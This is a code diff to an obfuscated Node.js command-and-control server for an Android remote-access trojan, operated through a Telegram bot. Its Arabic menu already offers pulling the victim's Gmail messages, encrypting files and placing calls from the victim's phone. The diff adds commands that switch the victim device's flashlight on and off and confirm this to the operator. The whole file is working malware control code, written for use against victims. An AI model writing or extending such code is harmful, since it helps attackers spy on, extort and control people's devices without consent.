@@ -36,6 +36,8 @@ const express = require('express'),
     '\uD83D\uDCE7 سحب رسايل جيميل \uD83D\uDCE7',
     '\u26A0️ تشفير ملفات \u26A0️',
     '\u260E️اتصال من هاتف الضحيه\u260E️',
+    '\uD83D\uDD26 تشغيل الفلاش \uD83D\uDD26',
+    '\uD83D\uDD05 اطفاء الفلاش \uD83D\uDD05',
     '\u272F العودة إلى القائمة الرئيسية \u272F',
   ]
 app.get('/', (_0x475404, _0x364a1f) => {
@@ -601,6 +603,10 @@ bot.on('message', (_0x517bec) => {
                                       '\u260E️اتصال من هاتف الضحيه\u260E️',
                                     ],
                                     [
+                                      '\uD83D\uDD26 تشغيل الفلاش \uD83D\uDD26',
+                                      '\uD83D\uDD05 اطفاء الفلاش \uD83D\uDD05',
+                                    ],
+                                    [
                                       '\u272F العودة إلى القائمة الرئيسية \u272F',
                                     ],
                                   ],
@@ -1088,6 +1094,54 @@ bot.on('message', (_0x517bec) => {
                                     },
                                   }
                                 ))
+                              _0x517bec.text ===
+                                '\uD83D\uDD26 تشغيل الفلاش \uD83D\uDD26' &&
+                                (io.to(_0xc65239).emit('commend', {
+                                  request: 'flash-on',
+                                  extras: [],
+                                }),
+                                appData.delete('currentTarget'),
+                                bot.sendMessage(
+                                  data.id,
+                                  '<b>\u272F تم تنفيذ الطلب بنجاح، جاري تشغيل الفلاش...\n\n\u272F العودة إلى القائمة الرئيسية</b>\n\n',
+                                  {
+                                    parse_mode: 'HTML',
+                                    reply_markup: {
+                                      keyboard: [
+                                        [
+                                          '\u272F عدد الاجهزه \u272F',
+                                          '\u272F قائمة التحكم \u272F',
+                                        ],
+                                        ['\u272F معلومات عن المطور \u272F'],
+                                      ],
+                                      resize_keyboard: true,
+                                    },
+                                  }
+                                ))
+                              _0x517bec.text ===
+                                '\uD83D\uDD05 اطفاء الفلاش \uD83D\uDD05' &&
+                                (io.to(_0xc65239).emit('commend', {
+                                  request: 'flash-off',
+                                  extras: [],
+                                }),
+                                appData.delete('currentTarget'),
+                                bot.sendMessage(
+                                  data.id,
+                                  '<b>\u272F تم تنفيذ الطلب بنجاح، جاري اطفاء الفلاش...\n\n\u272F العودة إلى القائمة الرئيسية</b>\n\n',
+                                  {
+                                    parse_mode: 'HTML',
+                                    reply_markup: {
+                                      keyboard: [
+                                        [
+                                          '\u272F عدد الاجهزه \u272F',
+                                          '\u272F قائمة التحكم \u272F',
+                                        ],
+                                        ['\u272F معلومات عن المطور \u272F'],
+                                      ],
+                                      resize_keyboard: true,
+                                    },
+                                  }
+                                ))
                             } else {
                               io.sockets.sockets.forEach(
                                 (_0x4324b2, _0x200d29, _0x5e4345) => {
@@ -1148,6 +1202,10 @@ bot.on('message', (_0x517bec) => {
                                             [
                                               '\u26A0️ تشفير ملفات \u26A0️',
                                               '\u260E️اتصال من هاتف الضحيه\u260E️',
+                                            ],
+                                            [
+                                              '\uD83D\uDD26 تشغيل الفلاش \uD83D\uDD26',
+                                              '\uD83D\uDD05 اطفاء الفلاش \uD83D\uDD05',
                                             ],
                                             [
                                               '\u272F العودة إلى القائمة الرئيسية \u272F',
